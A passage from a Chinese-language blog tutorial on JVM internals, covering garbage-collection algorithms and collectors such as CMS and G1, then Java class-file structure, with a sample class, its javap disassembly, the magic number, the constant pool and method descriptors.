alt=\"image-20220222205605690\"></p>\n</li>\n</ul>\n<h5 id=\"标记-清除算法\"><a href=\"#标记-清除算法\" class=\"headerlink\" title=\"标记-清除算法\"></a>标记-清除算法</h5><p>前面我们已经了解了整个堆内存实际上是以分代收集机制为主，但是依然没有讲到具体的收集过程，那么，具体的回收过程又是什么样的呢？首先我们来了解一下最古老的<code>标记-清除</code>算法。</p>\n<p>首先标记出所有需要回收的对象，然后再依次回收掉被标记的对象，或是标记出所有不需要回收的对象，只回收未标记的对象。实际上这种算法是非常基础的，并且最易于理解的（这里对象我就以一个方框代替了，当然实际上存放是我们前说到的GC Roots形式）</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24egy1gzme6btluwj21e40c0760.jpg\" alt=\"image-20220222165709034\"></p>\n<p>虽然此方法非常简单，但是缺点也是非常明显的 ，首先如果内存中存在大量的对象，那么可能就会存在大量的标记，并且大规模进行清除。并且一次标记清除之后，连续的内存空间可能会出现许许多多的空隙，碎片化会导致连续内存空间利用率降低。</p>\n<h5 id=\"标记-复制算法\"><a href=\"#标记-复制算法\" class=\"headerlink\" title=\"标记-复制算法\"></a>标记-复制算法</h5><p>既然标记清除算法在面对大量对象时效率低，那么我们可以采用标记-复制算法。它将容量分为同样大小的两块区域，</p>\n<p>标记复制算法，实际上就是将内存区域划分为大小相同的两块区域，每次只使用其中的一块区域，每次垃圾回收结束后，将所有存活的对象全部复制到另一块区域中，并一次性清空当前区域。虽然浪费了一些时间进行复制操作，但是这样能够很好地解决对象大面积回收后空间碎片化严重的问题。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzmlh5aveqj21ti0u079c.jpg\" alt=\"image-20220222210942507\"></p>\n<p>这种算法就非常适用于新生代（因为新生代的回收效率极高，一般不会留下太多的对象）的垃圾回收，而我们之前所说的新生代Survivor区其实就是这个思路，包括8:1:1的比例也正是为了对标记复制算法进行优化而采取的。</p>\n<h5 id=\"标记-整理算法\"><a href=\"#标记-整理算法\" class=\"headerlink\" title=\"标记-整理算法\"></a>标记-整理算法</h5><p>虽然标记-复制算法能够很好地应对新生代高回收率的场景，但是放到老年代，它就显得很鸡肋了。我们知道，一般长期都回收不到的对象，才有机会进入到老年代，所以老年代一般都是些钉子户，可能一次GC后，仍然存留很多对象。而标记复制算法会在GC后完整复制整个区域内容，并且会折损50%的区域，显然这并不适用于老年代。</p>\n<p>那么我们能否这样，在标记所有待回收对象之后，不急着去进行回收操作，而是将所有待回收的对象整齐排列在一段内存空间中，而需要回收的对象全部往后丢，这样，前半部分的所有对象都是无需进行回收的，而后半部分直接一次性清除即可。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzmm4g8voxj21vm08ywhj.jpg\" alt=\"image-20220222213208681\"></p>\n<p>虽然这样能保证内存空间充分使用，并且也没有标记复制算法那么繁杂，但是缺点也是显而易见的，它的效率比前两者都低。甚至，由于需要修改对象在内存中的位置，此时程序必须要暂停才可以，在极端情况下，可能会导致整个程序发生停顿（被称为“Stop The World”）。</p>\n<p>所以，我们可以将标记清除算法和标记整理算法混合使用，在内存空间还不是很凌乱的时候，采用标记清除算法其实是没有多大问题的，当内存空间凌乱到一定程度后，我们可以进行一次标记整理算法。</p>\n<h4 id=\"各种垃圾收集器-只讲部分具有代表性的\"><a href=\"#各种垃圾收集器-只讲部分具有代表性的\" class=\"headerlink\" title=\"各种垃圾收集器 (只讲部分具有代表性的)\"></a>各种垃圾收集器 (只讲部分具有代表性的)</h4><h5 id=\"Serial\"><a href=\"#Serial\" class=\"headerlink\" title=\"Serial\"></a>Serial</h5><p>这款垃圾收集器也是元老级别的收集器了，在JDK1.3.1之前，是虚拟机新生代区域收集器的唯一选择。这是一款单线程的垃圾收集器，也就是说，当开始进行垃圾回收时，需要暂停所有的线程，直到垃圾收集工作结束。它的新生代收集算法采用的是标记复制算法，老年代采用的是标记整理算法。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzn92k8ooej21ae0bc75m.jpg\" alt=\"image-20220223104605648\"></p>\n<p>可以看到，当进入到垃圾回收阶段时，所有的用户线程必须等待GC线程完成工作，就相当于你打一把游戏，中途每隔1分钟网络就卡5秒钟，这确实让人难以接受。</p>\n<p>虽然缺点很明显，但是优势也是显而易见的：</p>\n<ol>\n<li>设计简单而高效。</li>\n<li>在用户的桌面应用场景中，内存一般不大，可以在较短时间内完成垃圾收集，只要不频繁发生，使用串行回收器是可以接受的。</li>\n</ol>\n<h5 id=\"ParNew\"><a href=\"#ParNew\" class=\"headerlink\" title=\"ParNew\"></a>ParNew</h5><p>这款垃圾收集器相当于是Serial收集器的多线程版本，它能够支持多线程垃圾收集：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzn9vbvb0mj21c20c00uc.jpg\" alt=\"image-20220223111344962\"></p>\n<p>除了多线程支持以外，其他内容基本与Serial收集器一致，并且目前某些JVM默认的服务端模式新生代收集器就是使用的ParNew收集器。</p>\n<h5 id=\"CMS\"><a href=\"#CMS\" class=\"headerlink\" title=\"CMS\"></a>CMS</h5><p>在JDK1.5，HotSpot推出了一款在强交互应用中几乎可认为有划时代意义的垃圾收集器：CMS（Concurrent-Mark-Sweep）收集器，这款收集器是HotSpot虚拟机中第一款真正意义上的并发（注意这里的并发和之前的并行是有区别的，并发可以理解为同时运行用户线程和GC线程，而并行可以理解为多条GC线程同时工作）收集器，它第一次实现了让垃圾收集线程与用户线程同时工作。</p>\n<p>它主要采用标记清除算法：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznamys2bdj21as0co404.jpg\" alt=\"image-20220223114019381\"></p>\n<p>它的垃圾回收分为4个阶段：</p>\n<ul>\n<li>初始标记（需要暂停用户线程）：这个阶段的主要任务仅仅只是标记出GC Roots能直接关联到的对象，速度比较快，不用担心会停顿太长时间。</li>\n<li>并发标记：从GC Roots的直接关联对象开始遍历整个对象图的过程，这个过程耗时较长但是不需要停顿用户线程，可以与垃圾收集线程一起并发运行。</li>\n<li>重新标记（需要暂停用户线程）：由于并发标记阶段可能某些用户线程会导致标记产生变得，因此这里需要再次暂停所有线程进行并行标记，这个时间会比初始标记时间长一丢丢。</li>\n<li>并发清除：最后就可以直接将所有标记好的无用对象进行删除，因为这些对象程序中也用不到了，所以可以与用户线程并发运行。</li>\n</ul>\n<p>虽然它的优点非常之大，但是缺点也是显而易见的，我们之前说过，标记清除算法会产生大量的内存碎片，导致可用连续空间逐渐变少，长期这样下来，会有更高的概率触发Full GC，并且在与用户线程并发执行的情况下，也会占用一部分的系统资源，导致用户线程的运行速度一定程度上减慢。</p>\n<p>不过，如果你希望的是最低的GC停顿时间，这款垃圾收集器无疑是最佳选择，不过自从G1收集器问世之后，CMS收集器不再推荐使用了。</p>\n<h5 id=\"Garbage-First-JDK9\"><a href=\"#Garbage-First-JDK9\" class=\"headerlink\" title=\"Garbage First (JDK9+)\"></a>Garbage First (JDK9+)</h5><p>此垃圾收集器也是一款划时代的垃圾收集器，在JDK7的时候正式走上历史舞台，它是一款主要面向于服务端的垃圾收集器，并且在JDK9时，取代了JDK8默认的 Parallel Scavenge + Parallel Old 的回收方案。</p>\n<p>我们知道，我们的垃圾回收分为<code>Minor GC</code>、<code>Major GC </code>和<code>Full GC</code>，它们分别对应的是新生代，老年代和整个堆内存的垃圾回收，而G1收集器巧妙地绕过了这些约定，它将整个Java堆划分成<code>2048</code>个大小相同的独立<code>Region</code>块，每个<code>Region块</code>的大小根据堆空间的实际大小而定，整体被控制在1MB到32MB之间，且都为2的N次幂。所有的<code>Region</code>大小相同，且在JVM的整个生命周期内不会发生改变。</p>\n<p>那么分出这些<code>Region</code>有什么意义呢？每一个<code>Region</code>都可以根据需要，自由决定扮演哪个角色（Eden、Survivor和老年代），收集器会根据对应的角色采用不同的回收策略。此外，G1收集器还存在一个Humongous区域，它专门用于存放大对象（一般认为大小超过了Region容量一半的对象为大对象）这样，新生代、老年代在物理上，不再是一个连续的内存区域，而是到处分布的。</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznc9jvdzdj21f40eiq4g.jpg\" alt=\"image-20220223123636582\"></p>\n<p>它的回收过程与CMS大体类似：</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznc8vqqqij21h00emwgt.jpg\" alt=\"image-20220223123557871\"></p>\n<p>分为以下四个步骤：</p>\n<ul>\n<li>初始标记（暂停用户线程）：仅仅只是标记一下GC Roots能直接关联到的对象，并且修改TAMS指针的值，让下一阶段用户线程并发运行时，能正确地在可用的Region中分配新对象。这个阶段需要停顿线程，但耗时很短，而且是借用进行Minor GC的时候同步完成的，所以G1收集器在这个阶段实际并没有额外的停顿。</li>\n<li>并发标记：从GC Root开始对堆中对象进行可达性分析，递归扫描整个堆里的对象图，找出要回收的对象，这阶段耗时较长，但可与用户程序并发执行。</li>\n<li>最终标记（暂停用户线程）：对用户线程做一个短暂的暂停，用于处理并发标记阶段漏标的那部分对象。</li>\n<li>筛选回收：负责更新Region的统计数据，对各个Region的回收价值和成本进行排序，根据用户所期望的停顿时间来制定回收计划，可以自由选择任意多个Region构成回收集，然后把决定回收的那一部分Region的存活对象复制到空的Region中，再清理掉整个旧Region的全部空间。这里的操作涉及存活对象的移动，是必须暂停用户线程，由多个收集器线程并行完成的。</li>\n</ul>\n<h5 id=\"Shenandoah-amp-ZGC-低延迟\"><a href=\"#Shenandoah-amp-ZGC-低延迟\" class=\"headerlink\" title=\"Shenandoah &amp; ZGC (低延迟)\"></a>Shenandoah &amp; ZGC (低延迟)</h5><p>专为低延迟场景特化的垃圾收集器，论综合表现可能比不上G1，但他们暂停线程的时间比G1还要短得多。适合一些对GC延迟有特殊要求的特殊场景。具体不想介绍了，有兴趣可以课下了解，他们的几乎整个工作过程都是并发的，工作原理蛮有意思的。</p>\n<h2 id=\"字节码\"><a href=\"#字节码\" class=\"headerlink\" title=\"字节码\"></a>字节码</h2><p>终于写到这里了，我最想讲的就是这个，这个也最好玩:D</p>\n<h3 id=\"什么是字节码\"><a href=\"#什么是字节码\" class=\"headerlink\" title=\"什么是字节码\"></a>什么是字节码</h3><p>众所周知，Java是一门跨平台语言，只要能跑JVM的平台都能运行同一份Jar包。而Jar包其实本质上就是一堆class文件和一些资源文件打包放到一个压缩包里罢了，我们也可以直接运行class文件。那么class文件里面有什么内容呢？肯定不可能是机器码吧，如果是机器码要怎么跨平台？答案就是字节码。Kotlin之所以兼容Java，也是因为它是把kt文件编译成字节码，而Java和Kotlin之间的相互调用其实就是字节码之间的调用。JVM内置字节码解释器，在运行时动态解释字节码文件，把字节码翻译成对应平台的机器码运行。</p>\n<h3 id=\"类文件的基础结构\"><a href=\"#类文件的基础结构\" class=\"headerlink\" title=\"类文件的基础结构\"></a>类文件的基础结构</h3><p>Class文件是一组以8个字节为基础单位的二进制流，当遇到需要占用8个字节以上空间的数据项时，则会按照高位在前的方式分割成若干个8个字节进行存储。Class文件使用一种类似于C语言结构体的伪结构来存储数据，这种伪结构中只有两种数据类型: <strong>无符号数</strong>, <strong>表</strong>。后面的解析都以这两种数据类型为基础。</p>\n<p>我们先来看一段示例代码</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestClazz</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">sum</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> a<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> b<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute sum function.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> a <span class=\"token operator\">+</span> b<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>我们用<code>javap -verbose</code> 指令将它编译并解码为我们肉眼可以观测的字节码</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Classfile &#x2F;D:&#x2F;project&#x2F;android&#x2F;ksp-learn&#x2F;test&#x2F;build&#x2F;classes&#x2F;java&#x2F;main&#x2F;kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz.class\n  Last modified 2022-7-9; size 754 bytes\n  MD5 checksum 2b38afaa297c7960c988943b0c475282\n  Compiled from &quot;TestClazz.java&quot;\npublic class kim.bifrost.rain.ksp.TestClazz\n  minor version: 0\n  major version: 52\n  flags: ACC_PUBLIC, ACC_SUPER\nConstant pool:\n   #1 &#x3D; Methodref          #8.#27         &#x2F;&#x2F; java&#x2F;lang&#x2F;Object.&quot;&lt;init&gt;&quot;:()V\n   #2 &#x3D; Fieldref           #28.#29        &#x2F;&#x2F; java&#x2F;lang&#x2F;System.out:Ljava&#x2F;io&#x2F;PrintStream;\n   #3 &#x3D; Methodref          #7.#30         &#x2F;&#x2F; kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz.sum:(II)I\n   #4 &#x3D; Methodref          #31.#32        &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream.println:(I)V\n   #5 &#x3D; String             #33            &#x2F;&#x2F; execute sum function.\n   #6 &#x3D; Methodref          #31.#34        &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream.println:(Ljava&#x2F;lang&#x2F;String;)V\n   #7 &#x3D; Class              #35            &#x2F;&#x2F; kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz\n   #8 &#x3D; Class              #36            &#x2F;&#x2F; java&#x2F;lang&#x2F;Object\n   #9 &#x3D; Utf8               &lt;init&gt;\n  #10 &#x3D; Utf8               ()V\n  #11 &#x3D; Utf8               Code\n  #12 &#x3D; Utf8               LineNumberTable\n  #13 &#x3D; Utf8               LocalVariableTable\n  #14 &#x3D; Utf8               this\n  #15 &#x3D; Utf8               Lkim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz;\n  #16 &#x3D; Utf8               main\n  #17 &#x3D; Utf8               ([Ljava&#x2F;lang&#x2F;String;)V\n  #18 &#x3D; Utf8               args\n  #19 &#x3D; Utf8               [Ljava&#x2F;lang&#x2F;String;\n  #20 &#x3D; Utf8               a\n  #21 &#x3D; Utf8               I\n  #22 &#x3D; Utf8               b\n  #23 &#x3D; Utf8               sum\n  #24 &#x3D; Utf8               (II)I\n  #25 &#x3D; Utf8               SourceFile\n  #26 &#x3D; Utf8               TestClazz.java\n  #27 &#x3D; NameAndType        #9:#10         &#x2F;&#x2F; &quot;&lt;init&gt;&quot;:()V\n  #28 &#x3D; Class              #37            &#x2F;&#x2F; java&#x2F;lang&#x2F;System\n  #29 &#x3D; NameAndType        #38:#39        &#x2F;&#x2F; out:Ljava&#x2F;io&#x2F;PrintStream;\n  #30 &#x3D; NameAndType        #23:#24        &#x2F;&#x2F; sum:(II)I\n  #31 &#x3D; Class              #40            &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream\n  #32 &#x3D; NameAndType        #41:#42        &#x2F;&#x2F; println:(I)V\n  #33 &#x3D; Utf8               execute sum function.\n  #34 &#x3D; NameAndType        #41:#43        &#x2F;&#x2F; println:(Ljava&#x2F;lang&#x2F;String;)V\n  #35 &#x3D; Utf8               kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz\n  #36 &#x3D; Utf8               java&#x2F;lang&#x2F;Object\n  #37 &#x3D; Utf8               java&#x2F;lang&#x2F;System\n  #38 &#x3D; Utf8               out\n  #39 &#x3D; Utf8               Ljava&#x2F;io&#x2F;PrintStream;\n  #40 &#x3D; Utf8               java&#x2F;io&#x2F;PrintStream\n  #41 &#x3D; Utf8               println\n  #42 &#x3D; Utf8               (I)V\n  #43 &#x3D; Utf8               (Ljava&#x2F;lang&#x2F;String;)V\n&#123;\n  public kim.bifrost.rain.ksp.TestClazz();\n    descriptor: ()V\n    flags: ACC_PUBLIC\n    Code:\n      stack&#x3D;1, locals&#x3D;1, args_size&#x3D;1\n         0: aload_0\n         1: invokespecial #1                  &#x2F;&#x2F; Method java&#x2F;lang&#x2F;Object.&quot;&lt;init&gt;&quot;:()V\n         4: return\n      LineNumberTable:\n        line 10: 0\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0       5     0  this   Lkim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz;\n\n  public static void main(java.lang.String[]);\n    descriptor: ([Ljava&#x2F;lang&#x2F;String;)V\n    flags: ACC_PUBLIC, ACC_STATIC\n    Code:\n      stack&#x3D;3, locals&#x3D;3, args_size&#x3D;1\n         0: iconst_1\n         1: istore_1\n         2: iconst_2\n         3: iload_1\n         4: iadd\n         5: istore_2\n         6: getstatic     #2                  &#x2F;&#x2F; Field java&#x2F;lang&#x2F;System.out:Ljava&#x2F;io&#x2F;PrintStream;\n         9: iload_1\n        10: iload_2\n        11: invokestatic  #3                  &#x2F;&#x2F; Method sum:(II)I\n        14: invokevirtual #4                  &#x2F;&#x2F; Method java&#x2F;io&#x2F;PrintStream.println:(I)V\n        17: return\n      LineNumberTable:\n        line 12: 0\n        line 13: 2\n        line 14: 6\n        line 15: 17\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      18     0  args   [Ljava&#x2F;lang&#x2F;String;\n            2      16     1     a   I\n            6      12     2     b   I\n&#125;\nSourceFile: &quot;TestClazz.java&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"魔数-amp-Class文件版本\"><a href=\"#魔数-amp-Class文件版本\" class=\"headerlink\" title=\"魔数 &amp; Class文件版本\"></a>魔数 &amp; Class文件版本</h4><p>class文件的前4个Byte被称为魔数(Magic Number), 这些魔数的意义在于标识class文件。在类的加载阶段会根据这头四个Byte判断是否是合法的class文件。魔数的选取也颇有历史渊源<code>0xCAFE BABE</code>，Java的创始人十分喜欢咖啡:)。</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg\" alt=\"aZx0S4EjfY\"></p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg\" alt=\"飞书20220709-173350\"></p>\n<p>随后第四个字节，也就是7列存储着字节码的版本号。这里是34，从16进制翻译过来就是52，对应着Java8的字节码版本。</p>\n<p>第5和第6个字节是次版本号（Minor Version）,第7，8个字节是主版本号（Major Version）。Java是版本号是从45开始，JDK1.1之后的每个JDK大版本发布主版本号向上+1，高版本的JDK能向下兼容以前版本的Class文件，而不能运行以后版本的Class文件。</p>\n<h4 id=\"常量池\"><a href=\"#常量池\" class=\"headerlink\" title=\"常量池\"></a>常量池</h4><p>即</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Constant pool:\n   #1 &#x3D; Methodref          #8.#27         &#x2F;&#x2F; java&#x2F;lang&#x2F;Object.&quot;&lt;init&gt;&quot;:()V\n   #2 &#x3D; Fieldref           #28.#29        &#x2F;&#x2F; java&#x2F;lang&#x2F;System.out:Ljava&#x2F;io&#x2F;PrintStream;\n   #3 &#x3D; Methodref          #7.#30         &#x2F;&#x2F; kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz.sum:(II)I\n   #4 &#x3D; Methodref          #31.#32        &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream.println:(I)V\n   #5 &#x3D; String             #33            &#x2F;&#x2F; execute sum function.\n   #6 &#x3D; Methodref          #31.#34        &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream.println:(Ljava&#x2F;lang&#x2F;String;)V\n   #7 &#x3D; Class              #35            &#x2F;&#x2F; kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz\n   #8 &#x3D; Class              #36            &#x2F;&#x2F; java&#x2F;lang&#x2F;Object\n   #9 &#x3D; Utf8               &lt;init&gt;\n  #10 &#x3D; Utf8               ()V\n  #11 &#x3D; Utf8               Code\n  #12 &#x3D; Utf8               LineNumberTable\n  #13 &#x3D; Utf8               LocalVariableTable\n  #14 &#x3D; Utf8               this\n  #15 &#x3D; Utf8               Lkim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz;\n  #16 &#x3D; Utf8               main\n  #17 &#x3D; Utf8               ([Ljava&#x2F;lang&#x2F;String;)V\n  #18 &#x3D; Utf8               args\n  #19 &#x3D; Utf8               [Ljava&#x2F;lang&#x2F;String;\n  #20 &#x3D; Utf8               a\n  #21 &#x3D; Utf8               I\n  #22 &#x3D; Utf8               b\n  #23 &#x3D; Utf8               sum\n  #24 &#x3D; Utf8               (II)I\n  #25 &#x3D; Utf8               SourceFile\n  #26 &#x3D; Utf8               TestClazz.java\n  #27 &#x3D; NameAndType        #9:#10         &#x2F;&#x2F; &quot;&lt;init&gt;&quot;:()V\n  #28 &#x3D; Class              #37            &#x2F;&#x2F; java&#x2F;lang&#x2F;System\n  #29 &#x3D; NameAndType        #38:#39        &#x2F;&#x2F; out:Ljava&#x2F;io&#x2F;PrintStream;\n  #30 &#x3D; NameAndType        #23:#24        &#x2F;&#x2F; sum:(II)I\n  #31 &#x3D; Class              #40            &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream\n  #32 &#x3D; NameAndType        #41:#42        &#x2F;&#x2F; println:(I)V\n  #33 &#x3D; Utf8               execute sum function.\n  #34 &#x3D; NameAndType        #41:#43        &#x2F;&#x2F; println:(Ljava&#x2F;lang&#x2F;String;)V\n  #35 &#x3D; Utf8               kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz\n  #36 &#x3D; Utf8               java&#x2F;lang&#x2F;Object\n  #37 &#x3D; Utf8               java&#x2F;lang&#x2F;System\n  #38 &#x3D; Utf8               out\n  #39 &#x3D; Utf8               Ljava&#x2F;io&#x2F;PrintStream;\n  #40 &#x3D; Utf8               java&#x2F;io&#x2F;PrintStream\n  #41 &#x3D; Utf8               println\n  #42 &#x3D; Utf8               (I)V\n  #43 &#x3D; Utf8               (Ljava&#x2F;lang&#x2F;String;)V<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>紧接着主次版本号之后的是常量池入口，常量池可以比喻为Class文件里的资源仓库，它是Class文件结构中与其他项目关联最多的数据。</p>\n<p>首先上来就会有一个1字节的无符号数，它用于表示当前常量的类型（常量类型有很多个）这里只列举一部分的类型介绍：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">类型</th>\n<th align=\"center\">标志</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Utf8_info</td>\n<td align=\"center\">1</td>\n<td align=\"center\">UTF-8编码格式的字符串</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Integer_info</td>\n<td align=\"center\">3</td>\n<td align=\"center\">整形字面量（第一章我们演示的很大的数字，实际上就是以字面量存储在常量池中的）</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Class_info</td>\n<td align=\"center\">7</td>\n<td align=\"center\">类或接口的符号引用</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_String_info</td>\n<td align=\"center\">8</td>\n<td align=\"center\">字符串类型的字面量</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Fieldref_info</td>\n<td align=\"center\">9</td>\n<td align=\"center\">字段的符号引用</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Methodref_info</td>\n<td align=\"center\">10</td>\n<td align=\"center\">方法的符号引用</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_MethodType_info</td>\n<td align=\"center\">16</td>\n<td align=\"center\">方法类型</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n<td align=\"center\">12</td>\n<td align=\"center\">字段或方法的部分符号引用</td>\n</tr>\n</tbody></table>\n<p>实际上这些东西，虽然我们不知道符号引用是什么东西，我们可以观察出来，这些东西或多或少都是存放类中一些名称、数据之类的东西。</p>\n<p>比如我们来看第一个<code>CONSTANT_Methodref_info</code>表中存放了什么数据，这里我只列出它的结构表（详细的结构表可以查阅《深入理解Java虚拟机 第三版》中222页总表）：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">常量</th>\n<th align=\"center\">项目</th>\n<th align=\"center\">类型</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Methodref_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">值为10</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向声明方法的类描述父CONSTANT_Class_info索引项</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向名称及类型描述符CONSTANT_NameAndType_info索引项</td>\n</tr>\n</tbody></table>\n<p>再看看它指向的<code>CONSTANT_Class_info</code>和<code>CONSTANT_NameAndType_info</code>的结构</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">常量</th>\n<th align=\"center\">项目</th>\n<th align=\"center\">类型</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Class_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">值为7</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向全限定名常量项的索引</td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th align=\"center\">常量</th>\n<th align=\"center\">项目</th>\n<th align=\"center\">类型</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">值为12</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向字段或方法名称常量项的索引</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">指向字段或方法描述符常量项的索引</td>\n</tr>\n</tbody></table>\n<h5 id=\"方法标识符\"><a href=\"#方法标识符\" class=\"headerlink\" title=\"方法标识符\"></a>方法标识符</h5><p>再说一下方法标识符，我们先找到sum方法的NameAndType常量</p>\n<blockquote>\n<p>#30 &#x3D; NameAndType        #23:#24        &#x2F;&#x2F; sum:(II)I</p>\n</blockquote>\n<p>我们会发现这里已经为我们标识出来了，#23对应<code>sum</code>，也就是方法名称。#24对应<code>(II)I</code>即方法标识符。</p>\n<p>那么这个(II)I有什么意思呢，括号内的两个I代表该方法有两个int类型的形参，括号后面的I代表该方法的返回值是int类型。</p>\n<p>至于不同类型的修饰符，我贴一个表在下面:</p>\n<p><img 